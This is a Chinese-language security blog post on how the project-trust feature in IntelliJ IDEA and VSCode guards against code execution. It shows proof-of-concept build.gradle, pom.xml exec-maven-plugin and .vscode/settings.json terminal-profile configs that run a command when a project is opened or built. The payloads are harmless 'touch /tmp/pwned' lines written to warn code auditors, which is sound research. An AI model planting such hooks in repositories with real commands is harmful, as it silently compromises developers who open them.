---
title: 利用项目配置文件进行 RCE - IDE Trust Project 功能探究
date: 2021-10-02 20:43:33
tags: [misc]
---

最近发现在打开 IDEA, VSCode 项目时候, 都增加了 "信任此项目的提示". 结合这些 IDE 的特点, 确实可能存在在打开项目时产生 RCE 的风险, 特别是进行代码审计的安全人员, 会经常打开未知的项目. 正常人肯定不会贸然的执行未知的代码, 但是对于打开项目时这个弹出的框框, 可能并不会特别在意. 接下来分析一些通过这些配置来进行 RCE 的方法.  

![](https://i.loli.net/2021/10/02/ToPQhtryzgDUdCs.png#center)

<!--more-->

## IDEA

### Gradle

最先想到的是 java 项目常用的构建工具 gradle. 它的 build 方式不同于 maven 的那种声明式 xml, 而是通过运行一个 build.gradle 脚本, 类似于 python 安装模块时的 setup.py. 我们自然可以通过编写恶意的 build.gradle 脚本来达到 RCE 的目的, 示例如下  

```gradle
plugins {
    id 'java'
}

group 'org.example'
version '1.0-SNAPSHOT'

exec {
    commandLine 'touch', '/tmp/pwned'
}

repositories {
    mavenCentral()
}

dependencies {
    testImplementation 'org.junit.jupiter:junit-jupiter-api:5.7.0'
    testRuntimeOnly 'org.junit.jupiter:junit-jupiter-engine:5.7.0'
}

test {
    useJUnitPlatform()
}
```

其中  
```
exec {
    commandLine 'touch', '/tmp/pwned'
}
```
即是 RCE 的部分, 非常的简单直接  
如果打开 Safe Mode, 是不会运行 build.gradle 的, 保证了用户的安全, 但是如果信任了这个项目, IDEA 就会自动运行 build.gradle  

### Maven

maven 在经过测试后, 似乎 IDEA 并没有真正的运行 `mvn` 命令, 在用户 0-click 的情况下, 似乎只是解析了 pom.xml, 然后下载依赖, 分析 main class, 并没有真正进行 maven 的 lifecycle  
但是如果目标会进行 mvn package 等操作, 我们可以通过 mvn plugin 插件达到 RCE 的目的.  

一个示例如下  
```xml
<plugins>
    <plugin>
    <artifactId>exec-maven-plugin</artifactId>
    <version>3.0.0</version>
    <groupId>org.codehaus.mojo</groupId>
    <executions>
        <execution>
        <id>exec</id>
        <phase>validate</phase>
        <goals>
            <goal>exec</goal>
        </goals>
        </execution>
    </executions>
    <configuration>
        <executable>touch</executable>
        <arguments>
        <argument>/tmp/pwned</argument>
        </arguments>
    </configuration>
    </plugin>
</plugins>
```
`exec-maven-plugin` 是一个现成的执行命令的 mvn plugin, 我们将其制定在 mvn phase = validate 时执行, 这样在目标进行 package 时就会执行 `touch /tmp/pwned` (一个可能受害的场景是打包成 jar 然后复制到 docker 里面运行)  

### IDEA 本身

除了这些常用的 build 工具, IDEA 本身也自带一个 `Startup Task` 功能, 在 `Tools -> Startup Task` 中可以找到, 我们可以自己添加一个 Shell Script 任务. 这些配置会保存在 `.idea/workspace.xml` 中, 并且这个利用方式应该可以给 Jetbrains 全家桶来使用, 会在项目打开时自动运行  

![](https://i.loli.net/2021/10/02/51Hy7hcepfXiGgC.png#center)

## VSCode

VSCode 本身功能较少, 大部分功能其实靠插件来实现, 所以我找到最泛用的是替换默认的 Shell 选项, 在 `.vscode/settings.json` 中添加  

```json
{
    "terminal.integrated.defaultProfile.linux": "bash",
    "terminal.integrated.profiles.linux": {
        "bash": {
            "path": "bash",
            "icon": "terminal-bash",
            "args": ["-c", "touch /tmp/pwned; bash"]
        },
        "zsh": {
            "path": "zsh",
        },
        "fish": {
            "path": "fish"
        },
        "tmux": {
            "path": "tmux",
            "icon": "terminal-tmux"
        },
        "pwsh": {
            "path": "pwsh",
            "icon": "terminal-powershell"
        }
    }
}
```

这样打开 vscode 的终端时, 就会无感执行命令  

## 总结

最后, 这些 IDE 丰富的功能确实留下来非常多的攻击面, 对陌生的项目最好好看看再进行 `Trust`. 不然漏洞还没找到, 自己先被对方反杀了.  